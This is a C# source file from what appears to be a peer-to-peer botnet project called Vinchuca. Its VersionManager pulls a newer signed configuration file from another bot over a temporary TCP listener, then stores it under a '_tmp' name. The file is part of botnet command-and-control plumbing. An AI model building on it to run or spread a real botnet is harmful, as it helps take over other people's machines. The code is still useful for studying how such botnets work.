using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Vinchuca.Crypto;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.System;

namespace Vinchuca
{
    public class VersionManager
    {
        private static readonly Log Logger = new Log(new TraceSource("Vers-Manager", SourceLevels.Verbose));

        private readonly MessageManager _messageManager;

        public VersionManager(MessageManager messageManager)
        {
            _messageManager = messageManager;
            AgentVersion = 1;
            ConfigurationFileVersion = 1;
        }

        public short AgentVersion { get; set; }
        public short ConfigurationFileVersion { get; set; }

        private string GetConfigFileNameFor(BotIdentifier botId)
        {
            return "_tmp" + botId.ToString().Substring(0, 10);
        }

        private string ConfigurationFileName => GetConfigFileNameFor(BotIdentifier.Id);

        public void CheckAgentVersion(short botVersion, BotIdentifier botId)
        {
            throw new NotImplementedException();
        }

        public void CheckConfigurationFileVersion(short cfgVersion, BotIdentifier botId)
        {
            if (cfgVersion > ConfigurationFileVersion)
            {
                Logger.Verbose("Updating config file version {0} to {1} from bot {2}", ConfigurationFileVersion, cfgVersion, botId);
                var port = new Random().Next(33000, 33999);
                var controllerIp = BotIdentifier.EndPoint.Address;
                var serverEndpoint = new IPEndPoint(controllerIp, port);
                var server = new TcpListener(serverEndpoint);
                server.Start();

                var message = new ShareFileMessage
                {
                    Path = GetConfigFileNameFor(botId),
                    Endpoint = serverEndpoint
                };
                _messageManager.Send(message, botId);
                var client = server.AcceptTcpClient();
                var stream = client.GetStream();
                var reader = new StreamReader(stream);
                var fileContent = reader.ReadToEnd();
                client.Close();
                server.Stop();
                var signer = new Signature();
                try
                {
                    var iosign = fileContent.Length - (2*Signature.Lenght);
                    var content = fileContent.Substring(0, iosign);
                    var signatureBase64 = fileContent.Substring(iosign);
                    var signature = Convert.FromBase64String(signatureBase64);
                    signer.Verify(Encoding.ASCII.GetBytes(content), signature);
                    File.WriteAllText(ConfigurationFileName, fileContent);
                    ConfigurationFileVersion = cfgVersion;
                }
                catch
                {
                    // ignored
                }
            }
        }
    }
}
